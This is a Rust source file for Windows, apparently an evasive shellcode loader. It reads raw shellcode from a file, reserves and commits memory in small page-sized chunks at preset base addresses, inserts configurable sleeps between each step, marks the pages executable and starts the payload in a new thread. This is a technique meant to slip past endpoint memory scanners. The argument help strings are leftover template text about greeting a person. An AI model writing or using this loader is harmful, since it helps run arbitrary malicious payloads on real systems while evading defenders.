use std::{fs::File, io::Read};
use clap::{arg, Parser};
use std::thread;
use std::time::Duration;
use windows::Win32::System::{Diagnostics::Debug::WriteProcessMemory, Memory::{
        VirtualAlloc, VirtualProtect, VirtualQuery, MEMORY_BASIC_INFORMATION, MEM_COMMIT, MEM_FREE, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_NOACCESS, PAGE_PROTECTION_FLAGS, PAGE_READWRITE
    }, SystemInformation::{GetSystemInfo, SYSTEM_INFO}, Threading::{CreateThread, GetCurrentProcess, WaitForSingleObject}};

static VC_PREF_BASES: [usize; 10] = [
    0x00000000DDDD0000,
    0x0000000010000000,
    0x0000000021000000,
    0x0000000032000000,
    0x0000000043000000,
    0x0000000050000000,
    0x0000000041000000,
    0x0000000042000000,
    0x0000000040000000,
    0x0000000022000000,
];

unsafe fn get_suitable_base_address(alloc_gran: usize, count_virtual_memory_reservations: usize) -> usize {
    let mut mbi = MEMORY_BASIC_INFORMATION::default();
    for base in VC_PREF_BASES {
        VirtualQuery(
            Some(base as *mut core::ffi::c_void),
            &mut mbi,
            std::mem::size_of::<MEMORY_BASIC_INFORMATION>()
        );

        if mbi.State == MEM_FREE {
            let mut i = 0;
            for _ in 0 .. count_virtual_memory_reservations {
                let current_base = base + i * alloc_gran;
                VirtualQuery(
                    Some(current_base as *mut core::ffi::c_void),
                    &mut mbi,
                    std::mem::size_of::<MEMORY_BASIC_INFORMATION>()
                );
                if mbi.State != MEM_FREE {
                    break
                }
                i += 1;
            }
            if i == count_virtual_memory_reservations {
                return base;
            }
        }
    }
    0
}

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    /// Name of the person to greet
    #[arg(short, long)]
    shellcode: String,

    /// Number of times to greet
    #[arg(short, long)]
    milliseconds: u64,
}

fn main() {
    let args = Args::parse();
    let file_path = args.shellcode;
    let milliseconds = args.milliseconds;
    let mut file = File::open(file_path).unwrap();
    let mut shellcode = Vec::new();
    let _ = file.read_to_end(&mut shellcode);

    unsafe {
        let mut sys_inf = SYSTEM_INFO::default();
        GetSystemInfo(&mut sys_inf);
        let page_size = sys_inf.dwPageSize as usize;
        let alloc_gran = sys_inf.dwAllocationGranularity as usize;
        
        let shellcode_len = shellcode.len();
        let count_virtual_memory_reservations = (shellcode_len / alloc_gran) + 1;
        let count_virtual_memory_commitments = alloc_gran / page_size;

        let base_addr = get_suitable_base_address(alloc_gran, count_virtual_memory_reservations);

        thread::sleep(Duration::from_millis(milliseconds));

        let mut current_base = base_addr;
        let mut vector_virtual_memory_reservations: Vec<usize> = Vec::new();

        for _ in 0..count_virtual_memory_reservations {

            thread::sleep(Duration::from_millis(milliseconds));

            let status = VirtualAlloc(Some(current_base as *mut core::ffi::c_void), alloc_gran, MEM_RESERVE, PAGE_NOACCESS);
            if status.is_null() { return; }
            vector_virtual_memory_reservations.push(current_base);
            current_base += alloc_gran;
        }

        let mut offset_shellcode: usize = 0;

        for i in 0..count_virtual_memory_reservations {
            for j in 0..count_virtual_memory_commitments {
                let offset = j * page_size;
                current_base = vector_virtual_memory_reservations[i] + offset;
                VirtualAlloc(Some(current_base as *mut core::ffi::c_void), page_size, MEM_COMMIT, PAGE_READWRITE);

                thread::sleep(Duration::from_millis(milliseconds));

                let end = if offset_shellcode + page_size < shellcode_len {
                    offset_shellcode + page_size
                } else {
                    shellcode_len
                };
                let slice = shellcode[offset_shellcode..end].as_ptr();
                _ = WriteProcessMemory(
                    GetCurrentProcess(),
                    current_base as *mut core::ffi::c_void,
                    slice as *mut core::ffi::c_void,
                    end - offset_shellcode,
                    Some(std::ptr::null_mut())
                );

                thread::sleep(Duration::from_millis(milliseconds));

                _ = VirtualProtect(current_base as *mut core::ffi::c_void, page_size, PAGE_EXECUTE_READ, &mut PAGE_PROTECTION_FLAGS(0));
                offset_shellcode += page_size;
                if offset_shellcode > shellcode_len {
                    break;
                }
            }
        }

        thread::sleep(Duration::from_millis(milliseconds));

        let thread = CreateThread(
            Some(std::ptr::null()),
            0,
            Some(std::mem::transmute(base_addr)),
            Some(std::ptr::null_mut()),
            windows::Win32::System::Threading::THREAD_CREATION_FLAGS(0),
            Some(std::ptr::null_mut()),
        ).unwrap();

        thread::sleep(Duration::from_millis(milliseconds));

        WaitForSingleObject(thread, u32::MAX);
    }
}